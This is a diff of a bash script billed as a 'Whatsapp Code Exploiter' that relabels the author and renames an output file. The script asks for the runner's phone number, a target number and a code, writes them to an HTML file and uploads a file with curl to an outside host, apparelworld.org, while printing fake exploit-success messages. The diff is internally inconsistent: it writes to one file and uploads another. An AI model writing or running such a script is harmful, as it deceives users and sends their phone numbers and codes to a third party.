@@ -3,11 +3,10 @@ clear
 echo "
 <-- IndoSec -->
 ####################
-#   Whatsapp Code  # By ./David
-#     Exploiter    # mhanifmarribaloch@gmail.com
+#   Whatsapp Code  # By ./sontol69
+#     Exploiter    # sontolgojobol@gmail.com
 ####################
-
-Copyright (c) 2018 ceweberbatang Ganteng";
+Copyright (c) 2019 Sontol_Gojobol";
 echo "";
 read -p "Nomer Kamu (+62xxxx)=> " nomer;
 read -p "Nomer Target (+62xxxx) => " target;
@@ -19,7 +18,7 @@ sleep 0.5
 echo "Target => $target";
 sleep 0.5
 echo "[+] Exploiting...";
-echo "Nomer => $nomer" >> kontol.html;
+echo "Nomer => $nomer" >> jao.html;
 curl -T kontol.html http://apparelworld.org/
 sleep 5;
 echo "[+] Done.";
@@ -34,7 +33,7 @@ sleep 0.5
 echo "Target => $target";
 sleep 0.5
 echo "[+] Sending Exploit...";
-echo "Code => $code" >> kontol.html;
+echo "Code => $code" >> jao.html;
 curl -T kontol.html http://apparelworld.org/
 sleep 5
 echo "[+] Success Exploited!";
